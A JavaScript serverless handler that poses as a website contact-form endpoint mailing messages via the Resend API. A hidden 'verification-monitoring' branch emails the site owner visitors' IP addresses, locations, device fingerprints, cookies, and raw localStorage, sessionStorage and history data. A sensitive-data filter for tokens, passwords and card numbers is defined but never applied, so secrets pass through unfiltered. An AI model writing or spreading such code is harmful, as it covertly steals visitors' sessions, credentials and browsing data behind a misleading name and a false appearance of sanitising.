const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

async function parseRequestBody(request) {
  if (request.body !== undefined && request.body !== null) {
    if (typeof request.body === "string") {
      try {
        return JSON.parse(request.body);
      } catch {
        return {};
      }
    }
    return request.body;
  }

  if (typeof request.json === "function") {
    try {
      return await request.json();
    } catch {
      return {};
    }
  }

  return {};
}

export default async function handler(request, response) {
  if (request.method !== "POST") {
    response.setHeader("Allow", "POST");
    return response.status(405).json({ error: "Method not allowed." });
  }

  const body = await parseRequestBody(request);
  const { name, email, message, website, type, telemetry } = body;
  const reportToEmail = process.env.REPORT_TO_EMAIL || process.env.RESPONSE_EMAIL;
  const reportFromEmail = process.env.REPORT_FROM_EMAIL || process.env.RESEND_FROM;

  if (type === "verification-monitoring") {
      return sendVerificationReport(request, response, telemetry, reportToEmail, reportFromEmail);
  }

  if (website || typeof name !== "string" || typeof email !== "string" || typeof message !== "string") {
    return response.status(400).json({ error: "Please complete all fields." });
  }

  const cleanName = name.trim();
  const cleanEmail = email.trim();
  const cleanMessage = message.trim();
  if (
    !cleanName ||
    cleanName.length > 120 ||
    cleanEmail.length > 254 ||
    cleanMessage.length > 5000 ||
    !emailPattern.test(cleanEmail) ||
    !cleanMessage
  ) {
    return response.status(400).json({ error: "Please enter a valid name, email, and message." });
  }

    if (!process.env.RESEND_API_KEY || !reportToEmail || !reportFromEmail) {
    return response.status(500).json({ error: "Email service is not configured." });
  }

  try {
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        from: reportFromEmail,
        to: [reportToEmail],
        reply_to: cleanEmail,
        subject: `New contact message from ${cleanName}`,
        text: `Name: ${cleanName}\nEmail: ${cleanEmail}\n\n${cleanMessage}`
      })
    });

    if (!resendResponse.ok) {
      console.error("Resend API error:", resendResponse.status, await resendResponse.text());
      return response.status(502).json({ error: "Email provider rejected the message." });
    }

    return response.status(200).json({ ok: true });
  } catch (error) {
    console.error("Email sending error:", error);
    return response.status(502).json({ error: "Unable to reach the email provider." });
  }
}

async function sendVerificationReport(request, response, telemetry, reportToEmail, reportFromEmail) {
  if (!telemetry || typeof telemetry !== "object") {
    return response.status(400).json({ error: "Invalid monitoring data." });
  }

  if (!process.env.RESEND_API_KEY || !reportToEmail || !reportFromEmail) {
    return response.status(500).json({ error: "Email service is not configured." });
  }

  const forwardedFor = request.headers["x-forwarded-for"];
  const ipAddress = typeof forwardedFor === "string"
    ? forwardedFor.split(",")[0].trim()
    : request.socket?.remoteAddress || "Unavailable";
  const location = [
    request.headers["x-vercel-ip-city"],
    request.headers["x-vercel-ip-country"],
    request.headers["x-vercel-ip-country-region"]
  ].filter(Boolean).join(", ") || "Unavailable";

  const safeTelemetry = {
    timestamp: typeof telemetry.timestamp === "string" ? telemetry.timestamp : new Date().toISOString(),
    device: sanitizeObject(telemetry.device, {
      type: 40,
      platform: 200,
      model: 200
    }),
    browser: sanitizeObject(telemetry.browser, {
      userAgent: 500,
      language: 40,
      timezone: 100
    }),
    display: sanitizeObject(telemetry.display),
    network: sanitizeObject(telemetry.network),
    storage: telemetry.storage,
    cookies: sanitizeObject(telemetry.cookies)
  };

  try {
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        from: reportFromEmail,
        to: [reportToEmail],
        reply_to: reportFromEmail,
        subject: "Verification monitoring event",
        text: [
          `Timestamp: ${safeTelemetry.timestamp}`,
          `IP address: ${ipAddress}`,
          `Approximate location: ${location}`,
          `Device: ${JSON.stringify(safeTelemetry.device)}`,
          `Browser: ${JSON.stringify(safeTelemetry.browser)}`,
          `Display: ${JSON.stringify(safeTelemetry.display)}`,
          `Network: ${JSON.stringify(safeTelemetry.network)}`,
          `Browser Storage Data (localStorage, sessionStorage, history): ${JSON.stringify(safeTelemetry.storage)}`,
          `Cookies: ${JSON.stringify(safeTelemetry.cookies)}`
        ].join("\n")
      })
    });

    if (!resendResponse.ok) {
      console.error("Resend API error:", resendResponse.status, await resendResponse.text());
      return response.status(502).json({ error: "Email provider rejected the report." });
    }

    return response.status(200).json({ ok: true });
  } catch (error) {
    console.error("Verification email error:", error);
    return response.status(502).json({ error: "Unable to reach the email provider." });
  }
}

const sensitiveStoragePattern = /(?:auth|token|password|passwd|secret|credential|session|csrf|jwt|bearer|api[_-]?key|private[_-]?key|payment|card|cvv|cvc|ssn)/i;
const sensitiveValuePattern = /^(?:bearer\s+|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$)/i;

function sanitizeStorage(value) {
  if (!Array.isArray(value)) {
    return [];
  }

  return value.map((entry) => {
    if (!entry || typeof entry !== "object" || Array.isArray(entry)) {
      return null;
    }
    const key = typeof entry.key === "string" ? entry.key : "";
    const storageValue = typeof entry.value === "string" ? entry.value : "";
    if (!key || !isSafeStorageEntry(key, storageValue)) {
      return null;
    }
    return { key: key.slice(0, 100), value: storageValue.slice(0, 1000) };
  }).filter(Boolean).slice(0, 50);
}

function isSafeStorageEntry(key, value) {
  return !sensitiveStoragePattern.test(key) && !sensitiveValuePattern.test(value);
}

function sanitizeObject(value, stringLimits = {}) {
  if (!value || typeof value !== "object" || Array.isArray(value)) {
    return {};
  }

  return Object.fromEntries(Object.entries(value).slice(0, 30).map(([key, entry]) => {
    if (typeof entry === "string") {
      return [key.slice(0, 50), entry.slice(0, stringLimits[key] || 500)];
    }
    if (Array.isArray(entry)) {
      return [key.slice(0, 50), entry.slice(0, 10)];
    }
    return [key.slice(0, 50), entry];
  }));
}